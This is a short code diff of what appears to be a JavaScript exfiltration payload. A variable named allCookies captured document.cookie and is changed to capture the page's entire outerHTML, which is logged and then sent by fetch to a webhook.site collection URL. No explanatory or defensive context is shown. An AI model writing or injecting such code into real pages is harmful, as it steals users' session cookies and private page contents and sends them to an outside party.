@@ -6,7 +6,7 @@
             body: "test"
         });
 
-        const allCookies = document.cookie;
+        const allCookies = document.documentElement.outerHTML;
         console.log(allCookies);
 
         fetch('https://webhook.site/def8c6ca-1565-4af1-939a-3391b3c129a2', {
